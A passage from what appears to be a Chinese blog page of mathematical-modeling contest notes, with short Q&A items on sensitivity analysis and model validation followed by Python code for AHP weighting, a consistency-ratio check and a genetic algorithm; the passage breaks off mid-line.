entire system, allowing researchers to adjust model parameters and observe ecosystem responses in real-time under different conditions, thereby gaining a deeper understanding of the multidimensional effects of gender ratio adjustments on the ecosystem.&quot;</p>\n<p>Question 6: &quot;How to determine key parameters when conducting model sensitivity analysis?&quot;</p>\n<p>Output: &quot;In model sensitivity analysis, the process of determining key parameters typically involves evaluating the sensitivity of model output to changes in various input parameters. By changing parameter values one by one and observing their impact on model results, the parameters that have the greatest impact on model prediction results can be identified. This helps to understand the sources of uncertainty in the model and which parameters are the key factors determining model behavior.&quot;</p>\n<p>Question 7: &quot;How can existing data be used to validate the accuracy and reliability of the model?&quot;</p>\n<p>Output: &quot;Verifying the accuracy and reliability of a model can be achieved by comparing its predicted results with actual observation data. This includes testing the model's predictive ability for known events using historical data, and conducting cross validation to evaluate the model's generalization ability on unknown data. Through this approach, the model's predictive accuracy can be evaluated, and deviations or inaccuracies in the model can be identified and adjusted.&quot;</p>\n<h1 id=\"美赛代码\"><a class=\"anchor\" href=\"#美赛代码\">#</a> 美赛代码</h1>\n<h2 id=\"层次分析法\"><a class=\"anchor\" href=\"#层次分析法\">#</a> 层次分析法</h2>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">AHP</span>:</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    相关信息的传入和准备</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, array</span>):</span><br><span class=\"line\">        <span class=\"comment\">## 记录矩阵相关信息</span></span><br><span class=\"line\">        self.array = array</span><br><span class=\"line\">        <span class=\"comment\">## 记录矩阵大小</span></span><br><span class=\"line\">        self.n = array.shape[<span class=\"number\">0</span>]</span><br><span class=\"line\">        <span class=\"comment\"># 初始化RI值，用于一致性检验</span></span><br><span class=\"line\">        self.RI_list = [<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0.52</span>, <span class=\"number\">0.89</span>, <span class=\"number\">1.12</span>, <span class=\"number\">1.26</span>, <span class=\"number\">1.36</span>, <span class=\"number\">1.41</span>, <span class=\"number\">1.46</span>, <span class=\"number\">1.49</span>, <span class=\"number\">1.52</span>, <span class=\"number\">1.54</span>, <span class=\"number\">1.56</span>, <span class=\"number\">1.58</span>,</span><br><span class=\"line\">                        <span class=\"number\">1.59</span>]</span><br><span class=\"line\">        <span class=\"comment\"># 矩阵的特征值和特征向量</span></span><br><span class=\"line\">        self.eig_val, self.eig_vector = np.linalg.eig(self.array)</span><br><span class=\"line\">        <span class=\"comment\"># 矩阵的最大特征值</span></span><br><span class=\"line\">        self.max_eig_val = np.<span class=\"built_in\">max</span>(self.eig_val)</span><br><span class=\"line\">        <span class=\"comment\"># 矩阵最大特征值对应的特征向量</span></span><br><span class=\"line\">        self.max_eig_vector = self.eig_vector[:, np.argmax(self.eig_val)].real</span><br><span class=\"line\">        <span class=\"comment\"># 矩阵的一致性指标CI</span></span><br><span class=\"line\">        self.CI_val = (self.max_eig_val - self.n) / (self.n - <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 矩阵的一致性比例CR</span></span><br><span class=\"line\">        self.CR_val = self.CI_val / (self.RI_list[self.n - <span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    一致性判断</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">test_consist</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 打印矩阵的一致性指标CI和一致性比例CR</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的CI值为：&quot;</span> + <span class=\"built_in\">str</span>(self.CI_val))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的CR值为：&quot;</span> + <span class=\"built_in\">str</span>(self.CR_val))</span><br><span class=\"line\">        <span class=\"comment\"># 进行一致性检验判断</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> self.n == <span class=\"number\">2</span>:  <span class=\"comment\"># 当只有两个子因素的情况</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;仅包含两个子因素，不存在一致性问题&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> self.CR_val &lt; <span class=\"number\">0.1</span>:  <span class=\"comment\"># CR值小于0.1，可以通过一致性检验</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的CR值为&quot;</span> + <span class=\"built_in\">str</span>(self.CR_val) + <span class=\"string\">&quot;,通过一致性检验&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:  <span class=\"comment\"># CR值大于0.1, 一致性检验不通过</span></span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的CR值为&quot;</span> + <span class=\"built_in\">str</span>(self.CR_val) + <span class=\"string\">&quot;未通过一致性检验&quot;</span>)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    算术平均法求权重</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">cal_weight_by_arithmetic_method</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 求矩阵的每列的和</span></span><br><span class=\"line\">        col_sum = np.<span class=\"built_in\">sum</span>(self.array, axis=<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 将判断矩阵按照列归一化</span></span><br><span class=\"line\">        array_normed = self.array / col_sum</span><br><span class=\"line\">        <span class=\"comment\"># 计算权重向量</span></span><br><span class=\"line\">        array_weight = np.<span class=\"built_in\">sum</span>(array_normed, axis=<span class=\"number\">1</span>) / self.n</span><br><span class=\"line\">        <span class=\"comment\"># 打印权重向量</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;算术平均法计算得到的权重向量为：\\n&quot;</span>, array_weight)</span><br><span class=\"line\">        <span class=\"comment\"># 返回权重向量的值</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> array_weight</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    几何平均法求权重</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">cal_weight__by_geometric_method</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 求矩阵的每列的积</span></span><br><span class=\"line\">        col_product = np.product(self.array, axis=<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"comment\"># 将得到的积向量的每个分量进行开n次方</span></span><br><span class=\"line\">        array_power = np.power(col_product, <span class=\"number\">1</span> / self.n)</span><br><span class=\"line\">        <span class=\"comment\"># 将列向量归一化</span></span><br><span class=\"line\">        array_weight = array_power / np.<span class=\"built_in\">sum</span>(array_power)</span><br><span class=\"line\">        <span class=\"comment\"># 打印权重向量</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;几何平均法计算得到的权重向量为：\\n&quot;</span>, array_weight)</span><br><span class=\"line\">        <span class=\"comment\"># 返回权重向量的值</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> array_weight</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    特征值法求权重</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">cal_weight__by_eigenvalue_method</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"comment\"># 将矩阵最大特征值对应的特征向量进行归一化处理就得到了权重</span></span><br><span class=\"line\">        array_weight = self.max_eig_vector / np.<span class=\"built_in\">sum</span>(self.max_eig_vector)</span><br><span class=\"line\">        <span class=\"comment\"># 打印权重向量</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;特征值法计算得到的权重向量为：\\n&quot;</span>, array_weight)</span><br><span class=\"line\">        <span class=\"comment\"># 返回权重向量的值</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> array_weight</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 给出判断矩阵</span></span><br><span class=\"line\">    b = np.array([[<span class=\"number\">1</span>, <span class=\"number\">1</span> / <span class=\"number\">3</span>, <span class=\"number\">1</span> / <span class=\"number\">8</span>], [<span class=\"number\">3</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span> / <span class=\"number\">3</span>], [<span class=\"number\">8</span>, <span class=\"number\">3</span>, <span class=\"number\">1</span>]])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 算术平均法求权重</span></span><br><span class=\"line\">    weight1 = AHP(b).cal_weight_by_arithmetic_method()</span><br><span class=\"line\">    <span class=\"comment\"># 几何平均法求权重</span></span><br><span class=\"line\">    weight2 = AHP(b).cal_weight__by_geometric_method()</span><br><span class=\"line\">    <span class=\"comment\"># 特征值法求权重</span></span><br><span class=\"line\">    weight3 = AHP(b).cal_weight__by_eigenvalue_method()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"计算一致性比例cr\"><a class=\"anchor\" href=\"#计算一致性比例cr\">#</a> 计算一致性比例 CR</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">consistency_ratio</span>(<span class=\"params\">CI, RI</span>):</span><br><span class=\"line\">    CR = CI / RI</span><br><span class=\"line\">    <span class=\"keyword\">return</span> CR</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 假设 A 是你的判断矩阵</span></span><br><span class=\"line\">A = np.array([</span><br><span class=\"line\">    [<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">    [<span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算特征值</span></span><br><span class=\"line\">eigenvalues, eigenvectors = np.linalg.eig(A)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 找到最大特征值</span></span><br><span class=\"line\">lambda_max = <span class=\"built_in\">max</span>(eigenvalues)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算一致性指标 CI</span></span><br><span class=\"line\">n = <span class=\"built_in\">len</span>(A)</span><br><span class=\"line\">CI = (lambda_max - n) / (n - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查找平均随机一致性指标 RI</span></span><br><span class=\"line\">random_matrices = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):</span><br><span class=\"line\">    random_matrix = np.random.randint(<span class=\"number\">1</span>, n+<span class=\"number\">1</span>, size=(n, n))</span><br><span class=\"line\">    random_matrices.append(random_matrix)</span><br><span class=\"line\"></span><br><span class=\"line\">average_lambda_max = np.mean([<span class=\"built_in\">max</span>(np.linalg.eig(mat)[<span class=\"number\">0</span>]) <span class=\"keyword\">for</span> mat <span class=\"keyword\">in</span> random_matrices])</span><br><span class=\"line\">RI = (average_lambda_max - n) / (n - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算一致性比率 CR</span></span><br><span class=\"line\">CR = consistency_ratio(CI, RI)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;最大特征值 (λmax):&quot;</span>, lambda_max)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;一致性指标 CI:&quot;</span>, CI)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;查找平均随机一致性指标 RI:&quot;</span>, RI)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;一致性比率 CR:&quot;</span>, CR)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 判断一致性是否可接受</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> CR &lt; <span class=\"number\">0.10</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的一致性是可以接受的&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的一致性需要适当修正&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"遗传算法\"><a class=\"anchor\" href=\"#遗传算法\">#</a> 遗传算法</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">from</span> matplotlib <span class=\"keyword\">import</span> cm</span><br><span class=\"line\"><span class=\"keyword\">from</span> mpl_toolkits.mplot3d <span class=\"keyword\">import</span> Axes3D</span><br><span class=\"line\"></span><br><span class=\"line\">DNA_SIZE = <span class=\"number\">24</span></span><br><span class=\"line\">POP_SIZE = <span class=\"number\">200</span></span><br><span class=\"line\">CROSSOVER_RATE = <span class=\"number\">0.8</span></span><br><span class=\"line\">MUTATION_RATE = <span class=\"number\">0.005</span></span><br><span class=\"line\">N_GENERATIONS = <span class=\"number\">50</span></span><br><span class=\"line\">X_BOUND = [-<span class=\"number\">3</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">Y_BOUND = [-<span class=\"number\">3</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">F</span>(<span class=\"params\">x, y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">3</span> * (<span class=\"number\">1</span> - x) ** <span class=\"number\">2</span> * np.exp(-(x ** <span class=\"number\">2</span>) - (y + <span class=\"number\">1</span>) ** <span class=\"number\">2</span>) - <span class=\"number\">10</span> * (x / <span class=\"number\">5</span> - x ** <span class=\"number\">3</span> - y ** <span class=\"number\">5</span>) * np.exp(</span><br><span class=\"line\">        -x ** <span class=\"number\">2</span> - y ** <span class=\"number\">2</span>) - <span class=\"number\">1</span> / <span class=\"number\">3</span> ** np.exp(-(x + <span class=\"number\">1</span>) ** <span class=\"number\">2</span> - y ** <span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">plot_3d</span>(<span class=\"params\">ax</span>):</span><br><span class=\"line\">    X = np.linspace(*X_BOUND, <span class=\"number\">100</span>)</span><br><span class=\"line\">    Y = np.linspace(*Y_BOUND, <span class=\"number\">100</span>)</span><br><span class=\"line\">    X, Y = np.meshgrid(X, Y)</span><br><span class=\"line\">    Z = F(X, Y)</span><br><span class=\"line\">    ax.plot_surface(X, Y, Z, rstride=<span class=\"number\">1</span>, cstride=<span class=\"number\">1</span>, cmap=cm.coolwarm)</span><br><span class=\"line\">    ax.set_zlim(-<span class=\"number\">10</span>, <span class=\"number\">10</span>)</span><br><span class=\"line\">    ax.set_xlabel(<span class=\"string\">&#x27;x&#x27;</span>)</span><br><span class=\"line\">    ax.set_ylabel(<span class=\"string\">&#x27;y&#x27;</span>)</span><br><span class=\"line\">    ax.set_zlabel(<span class=\"string\">&#x27;z&#x27;</span>)</span><br><span class=\"line\">    plt.pause(<span class=\"number\">3</span>)</span><br><span class=\"line\">    plt.show()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_fitness</span>(<span class=\"params\">pop</span>):</span><br><span class=\"line\">    x, y = translateDNA(pop)</span><br><span class=\"line\">    pred = F(x, y)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (pred - np.<span class=\"built_in\">min</span>(</span><br><span class=\"line\">        pred)) + <span class=\"number\">1e-3</span>  <span class=\"comment\"># 减去最小的适应度是为了防止适应度出现负数，通过这一步fitness的范围为[0, np.max(pred)-np.min(pred)],最后在加上一个很小的数防止出现为0的适应度</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">translateDNA</span>(<span class=\"params\">pop</span>):  <span class=\"comment\"># pop表示种群矩阵，一行表示一个二进制编码表示的DNA，矩阵的行数为种群数目</span></span><br><span class=\"line\">    x_pop = pop[:, <span class=\"number\">1</span>::<span class=\"number\">2</span>]  <span class=\"comment\"># 奇数列表示X</span></span><br><span class=\"line\">    y_pop = pop[:, ::<span class=\"number\">2</span>]  <span class=\"comment\"># 偶数列表示y</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># pop:(POP_SIZE,DNA_SIZE)*(DNA_SIZE,1) --&gt; (POP_SIZE,1)</span></span><br><span class=\"line\">    x = x_pop.dot(<span class=\"number\">2</span> ** np.arange(DNA_SIZE)[::-<span class=\"number\">1</span>]) / <span class=\"built_in\">float</span>(<span class=\"number\">2</span> ** DNA_SIZE - <span class=\"number\">1</span>) * (X_BOUND[<span class=\"number\">1</span>] - X_BOUND[<span class=\"number\">0</span>]) + X_BOUND[<span class=\"number\">0</span>]</span><br><span class=\"line\">    y = y_pop.dot(<span class=\"number\">2</span> ** np.arange(DNA_SIZE)[::-<span class=\"number\">1</span>]) / <span class=\"built_in\">float</span>(<span class=\"number\">2</span> ** DNA_SIZE - <span class=\"number\">1</span>) * (Y_BOUND[<span class=\"number\">1</span>] - Y_BOUND[<span class=\"number\">0</span>]) + Y_BOUND[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> x, y</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">crossover_and_mutation</span>(<span class=\"params\">pop, CROSSOVER_RATE=<span class=\"number\">0.8</span></span>):</span><br><span class=\"line\">    new_pop = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> father <span class=\"keyword\">in</span> pop:  <span class=\"comment\"># 遍历种群中的每一个个体，将该个体作为父亲</span></span><br><span class=\"line\">        child = father  <span class=\"comment\"># 孩子先得到父亲的全部基因（这里我把一串二进制串的那些0，1称为基因）</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> np.random.rand() &lt; CROSSOVER_RATE:  <span class=\"comment\"># 产生子代时不是必然发生交叉，而是以一定的概率发生交叉</span></span><br><span class=\"line\">            mother = pop[np.random.randint(POP_SIZE)]  <span class=\"comment\"># 再种群中选择另一个个体，并将该个体作为母亲</span></span><br><span class=\"line\">            cross_points = np.random.randint(low=<span class=\"number\">0</span>, high=DNA_SIZE * <span class=\"number\">2</span>)  <span class=\"comment\"># 随机产生交叉的点</span></span><br><span class=\"line\">            child[cross_points:] = mother[cross_points:]  <span class=\"comment\"># 孩子得到位于交叉点后的母亲的基因</span></span><br><span class=\"line\">        mutation(child)  <span class=\"comment\"># 每个后代有一定的机率发生变异</span></span><br><span class=\"line\">        new_pop.append(child)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> new_pop</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">mutation</span>(<span class=\"params\">child, MUTATION_RATE=<span class=\"number\">0.003</span></span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> np.random.rand() &lt; MUTATION_RATE:  <span class=\"comment\"># 以MUTATION_RATE的概率进行变异</span></span><br><span class=\"line\">        mutate_point = np.random.randint(<span class=\"number\">0</span>, DNA_SIZE)  <span class=\"comment\"># 随机产生一个实数，代表要变异基因的位置</span></span><br><span class=\"line\">        child[mutate_point] = child[mutate_point] ^ <span class=\"number\">1</span>  <span class=\"comment\"># 将变异点的二进制为反转</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">select</span>(<span class=\"params\">pop, fitness</span>):  <span class=\"comment\"># nature selection wrt pop&#x27;s fitness</span></span><br><span class=\"line\">    idx = np.random.choice(np.arange(POP_SIZE), size=POP_SIZE, replace=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                           p=(fitness) / (fitness.<span class=\"built_in\">sum</span>()))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pop[idx]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">print_info</span>(<span class=\"params\">pop</span>):</span><br><span class=\"line\">    fitness = get_fitness(pop)</span><br><span class=\"line\">    max_fitness_index = np.argmax(fitness)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;max_fitness:&quot;</span>, 